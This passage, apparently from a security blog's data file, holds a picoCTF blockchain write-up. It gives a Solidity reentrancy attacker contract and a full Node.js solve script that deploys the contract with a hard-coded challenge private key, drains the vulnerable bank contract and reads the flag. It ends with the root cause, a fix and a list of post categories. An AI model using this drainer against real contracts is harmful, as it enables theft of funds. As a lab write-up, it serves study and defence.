    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "owner");
        require(msg.value > 0, "value");

        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bankBal = address(bank).balance;
        if (bankBal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, "owner");
        owner.transfer(address(this).balance);
    }
}
\`\`\`

## Full Solve Flow

### Install dependencies

\`\`\`bash
cd /tmp
npm install ethers
npm install solc
\`\`\`

### Compile, deploy, attack, and read the flag

\`\`\`bash
node - <<'NODE'
const solc = require('/tmp/node_modules/solc');
const { ethers } = require('/tmp/node_modules/ethers');

const source = \`// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

    constructor(address _bank) {
        bank = IVulBank(_bank);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, 'owner');
        require(msg.value > 0, 'value');
        amount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = address(bank).balance;
        if (bal >= amount) {
            bank.withdraw(amount);
        }
    }

    function sweep() external {
        require(msg.sender == owner, 'owner');
        owner.transfer(address(this).balance);
    }
}\`;

const input = {
  language: 'Solidity',
  sources: { 'ReentranceAttacker.sol': { content: source } },
  settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } }
};

const output = JSON.parse(solc.compile(JSON.stringify(input)));
const c = output.contracts['ReentranceAttacker.sol']['ReentranceAttacker'];
const abi = c.abi;
const bytecode = '0x' + c.evm.bytecode.object;

const rpc = 'http://crystal-peak.picoctf.net:52781';
const pk = '0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691';
const bankAddr = '0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const bank = new ethers.Contract(bankAddr, ['function getFlag() view returns (string memory)'], provider);

  const factory = new ethers.ContractFactory(abi, bytecode, wallet);
  const attacker = await factory.deploy(bankAddr);
  await attacker.waitForDeployment();

  let tx = await attacker.attack({ value: ethers.parseEther('1') });
  await tx.wait();

  tx = await attacker.sweep();
  await tx.wait();

  const flag = await bank.getFlag();
  console.log(flag);
})();
NODE
\`\`\`

## What Happened On-Chain

Observed during the solve:

- Bank balance before attack: \`10000000000000000000\` wei (\`10 ETH\`)
- Attacker contract deployed at: \`0xf0be961E0ed50020AEA40F6a351D66a9eCBa2DdB\`
- Attack transaction: \`0x1a3f4af94d45b7f330bf88b14f1dca3bb81cdf41f793df0e538adbae4bb87eea\`
- Bank balance after attack: \`0\`
- Attacker contract balance after drain: \`11000000000000000000\` wei (\`11 ETH\`)

The extra \`1 ETH\` is the attacker's original deposit, recovered along with the stolen funds.

## Verification

### Challenge status endpoint

\`\`\`bash
curl -s http://crystal-peak.picoctf.net:53465/status
\`\`\`

### Result

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Root Cause

This bug exists because the contract violates the Checks-Effects-Interactions pattern.

Correct order should be:

1. Check preconditions.
2. Update internal state.
3. Interact with external contracts.

The vulnerable contract instead does:

1. Check.
2. Interact.
3. Update state.

That ordering allows a malicious contract to re-enter before its balance is reduced.

## Fix

The direct fix is to subtract the balance before the external call:

\`\`\`solidity
function withdraw(uint256 amount) external {
    require(amount <= balances[msg.sender], "Insufficient funds available");

    balances[msg.sender] -= amount;

    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
\`\`\`

Additional defenses:

- Use OpenZeppelin \`ReentrancyGuard\`.
- Prefer pull-payment designs carefully.
- Minimize external calls in sensitive accounting paths.
`,
  },
];

export const categories = [
  { name: "Malware Analysis", icon: "Search", count: 8 },
  { name: "Binary Exploitation", icon: "Binary", count: 14 },
  { name: "Reverse Engineering", icon: "Bug", count: 2 },
  { name: "HTB Writeup", icon: "Server", count: 2 },
  { name: "CTF Writeup", icon: "Trophy", count: 4 },
  { name: "Resources", icon: "BookOpen", count: 1 },
  { name: "picoCTF - Binary Exploitation", icon: "Binary", count: 8 },
  { name: "picoCTF - Reverse Engineering", icon: "Bug", count: 11 },
  { name: "picoCTF - Web Exploitation", icon: "Globe", count: 6 },
  { name: "picoCTF - General Skills", icon: "Terminal", count: 8 },
  { name: "picoCTF - Blockchain", icon: "Link", count: 4 },
];
